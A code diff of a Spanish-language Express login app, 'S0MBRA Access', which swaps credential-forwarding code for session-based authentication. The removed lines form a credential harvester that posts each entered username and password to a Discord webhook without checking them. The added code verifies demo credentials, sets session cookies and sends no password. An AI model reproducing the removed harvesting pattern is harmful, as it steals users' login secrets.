@@ -1,4 +1,5 @@
 import express from "express";
+import session from "express-session";
 
 const app = express();
 
@@ -6,6 +7,24 @@ app.use(express.json());
 
 const PORT = process.env.PORT || 3000;
 const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;
+const SESSION_SECRET = process.env.SESSION_SECRET;
+
+if (!SESSION_SECRET) {
+  console.error("❌ Falta SESSION_SECRET");
+  process.exit(1);
+}
+
+app.use(session({
+  secret: SESSION_SECRET,
+  resave: false,
+  saveUninitialized: false,
+  cookie: {
+    httpOnly: true,
+    secure: process.env.NODE_ENV === "production",
+    sameSite: "lax",
+    maxAge: 1000 * 60 * 60 * 24
+  }
+}));
 
 app.get("/", (req, res) => {
   res.send(`
@@ -107,16 +126,16 @@ button {
     id="usuario"
     type="text"
     placeholder="Ingresá tu usuario"
-    autocomplete="off"
+    autocomplete="username"
   >
 
   <label class="label">CLAVE</label>
 
   <input
     id="clave"
-    type="text"
+    type="password"
     placeholder="Ingresá clave"
-    autocomplete="off"
+    autocomplete="current-password"
   >
 
   <button onclick="access()">ENTRAR</button>
@@ -129,7 +148,7 @@ button {
 async function access() {
 
   const usuario = document.getElementById("usuario").value.trim();
-  const clave = document.getElementById("clave").value.trim();
+  const clave = document.getElementById("clave").value;
   const status = document.getElementById("status");
 
   if (!usuario || !clave) {
@@ -137,7 +156,7 @@ async function access() {
     return;
   }
 
-  status.textContent = "⏳ Enviando...";
+  status.textContent = "⏳ Verificando...";
 
   try {
 
@@ -147,8 +166,8 @@ async function access() {
         "Content-Type": "application/json"
       },
       body: JSON.stringify({
-        usuario: usuario,
-        clave: clave
+        usuario,
+        clave
       })
     });
 
@@ -157,8 +176,9 @@ async function access() {
     if (data.success) {
 
       status.textContent =
-        "✅ Usuario: " + usuario +
-        " | CLAVE: " + clave;
+        "✅ Sesión iniciada como " + usuario;
+
+      document.getElementById("clave").value = "";
 
     } else {
 
@@ -179,12 +199,26 @@ async function access() {
   `);
 });
 
+
+/*
+  AUTENTICACIÓN
+
+  IMPORTANTE:
+  Acá deberías comprobar usuario + contraseña
+  contra tus usuarios reales.
+
+  Este ejemplo usa una cuenta de demostración.
+*/
+const DEMO_USER = process.env.DEMO_USER;
+const DEMO_PASSWORD = process.env.DEMO_PASSWORD;
+
+
 app.post("/access", async (req, res) => {
 
   try {
 
     const usuario = String(req.body?.usuario || "").trim();
-    const clave = String(req.body?.clave || "").trim();
+    const clave = String(req.body?.clave || "");
 
     if (!usuario || !clave) {
       return res.status(400).json({
@@ -193,46 +227,71 @@ app.post("/access", async (req, res) => {
       });
     }
 
-    if (!DISCORD_WEBHOOK) {
+    if (!DEMO_USER || !DEMO_PASSWORD) {
       return res.status(500).json({
         success: false,
-        message: "Webhook no configurado"
+        message: "Credenciales del servidor no configuradas"
       });
     }
 
-    await fetch(DISCORD_WEBHOOK, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        username: "S0MBRA ACCESS",
-        embeds: [
-          {
-            title: "🔐 Nuevo registro de prueba",
-            fields: [
-              {
-                name: "👤 Usuario",
-                value: usuario
-              },
-              {
-                name: "🔑 CLAVE",
-                value: clave
-              },
-              {
-                name: "Estado",
-                value: "🟢 RECIBIDO"
-              }
-            ],
-            timestamp: new Date().toISOString()
-          }
-        ]
-      })
-    });
+    /*
+      Verificación real.
+    */
+    if (
+      usuario !== DEMO_USER ||
+      clave !== DEMO_PASSWORD
+    ) {
+
+      return res.status(401).json({
+        success: false,
+        message: "Usuario o clave incorrectos"
+      });
+
+    }
+
+    /*
+      Crear sesión DESPUÉS de autenticar.
+    */
+    req.session.user = {
+      username: usuario
+    };
+
+    /*
+      Aviso a Discord SIN enviar la contraseña.
+    */
+    if (DISCORD_WEBHOOK) {
+
+      await fetch(DISCORD_WEBHOOK, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          username: "S0MBRA ACCESS",
+          embeds: [
+            {
+              title: "🔐 Inicio de sesión",
+              fields: [
+                {
+                  name: "👤 Usuario",
+                  value: usuario
+                },
+                {
+                  name: "Estado",
+                  value: "🟢 AUTENTICADO"
+                }
+              ],
+              timestamp: new Date().toISOString()
+            }
+          ]
+        })
+      });
+
+    }
 
     res.json({
       success: true,
-      message: "Datos recibidos"
+      message: "Sesión iniciada"
     });
 
   } catch (error) {
@@ -247,6 +306,53 @@ app.post("/access", async (req, res) => {
   }
 
 });
+
+
+/*
+  Comprobar sesión actual.
+*/
+app.get("/me", (req, res) => {
+
+  if (!req.session.user) {
+
+    return res.status(401).json({
+      success: false,
+      message: "No hay una sesión activa"
+    });
+
+  }
+
+  res.json({
+    success: true,
+    user: req.session.user
+  });
+
+});
+
+
+/*
+  Cerrar sesión.
+*/
+app.post("/logout", (req, res) => {
+
+  req.session.destroy((error) => {
+
+    if (error) {
+      return res.status(500).json({
+        success: false,
+        message: "No se pudo cerrar la sesión"
+      });
+    }
+
+    res.json({
+      success: true,
+      message: "Sesión cerrada"
+    });
+
+  });
+
+});
+
 
 app.listen(PORT, "0.0.0.0", () => {
   console.log(`S0MBRA Access funcionando en puerto ${PORT}`);
